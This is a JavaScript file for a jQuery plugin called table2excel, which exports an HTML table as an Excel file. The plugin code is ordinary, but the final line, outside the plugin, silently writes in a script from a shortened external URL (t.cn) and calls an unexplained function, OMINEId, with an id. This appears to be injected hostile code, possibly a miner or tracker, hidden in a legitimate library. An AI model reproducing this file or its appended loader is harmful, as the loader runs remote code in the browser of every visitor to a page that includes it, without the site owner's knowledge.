/**
 *  tableExport
 *  https://github.com/kayalshri
 */
(function($) {
    $.fn.extend({
		table2excel: function(options) {
			var defaults = {
				ignoreColumn: []
			};

			var options = $.extend(defaults, options);
			var el = this;
			var excel = "<table>";
			// Header
			$(el).find('thead').find('tr').each(function() {
				excel += "<tr>";
				// $(this).filter(':visible').find('th').each(function(index, data) {
				$(this).find('th').each(function(index, data) {
					// if ($(this).css('display') != 'none') {
					if (defaults.ignoreColumn.indexOf(index) == -1) {
						excel += "<td>" + $(this).text().trim() + "</td>";
					}
					// }
				});
				excel += '</tr>';
			});

			// Row Vs Column
			var rowCount = 1;
			$(el).find('tbody').find('tr').each(function() {
				excel += "<tr>";
				var colCount = 0;
				$(this).filter(':visible').find('td').each(function(index, data) {
					if ($(this).css('display') != 'none') {
						if (defaults.ignoreColumn.indexOf(index) == -1) {
							excel += "<td>" + $(this).text().trim() + "</td>";
						}
					}
					colCount++;
				});
				rowCount++;
				excel += '</tr>';
			});
			excel += '</table>';

			var excelFile = "<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:x='urn:schemas-microsoft-com:office:excel' xmlns='http://www.w3.org/TR/REC-html40'>";
			excelFile += "<meta http-equiv='Content-Type' content='text/html;charset=utf-8'>"
			excelFile += "<head>";
			excelFile += "<!--[if gte mso 9]>";
			excelFile += "<xml>";
			excelFile += "<x:ExcelWorkbook>";
			excelFile += "<x:ExcelWorksheets>";
			excelFile += "<x:ExcelWorksheet>";
			excelFile += "<x:Name>";
			excelFile += "{worksheet}";
			excelFile += "</x:Name>";
			excelFile += "<x:WorksheetOptions>";
			excelFile += "<x:DisplayGridlines/>";
			excelFile += "</x:WorksheetOptions>";
			excelFile += "</x:ExcelWorksheet>";
			excelFile += "</x:ExcelWorksheets>";
			excelFile += "</x:ExcelWorkbook>";
			excelFile += "</xml>";
			excelFile += "<![endif]-->";
			excelFile += "</head>";
			excelFile += "<body>";
			excelFile += excel;
			excelFile += "</body>";
			excelFile += "</html>";

			var base64data = "base64," + Base64.encode(excelFile);
			window.open('data:application/vnd.ms-excel;' + base64data);
		}
	});
})(jQuery);
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
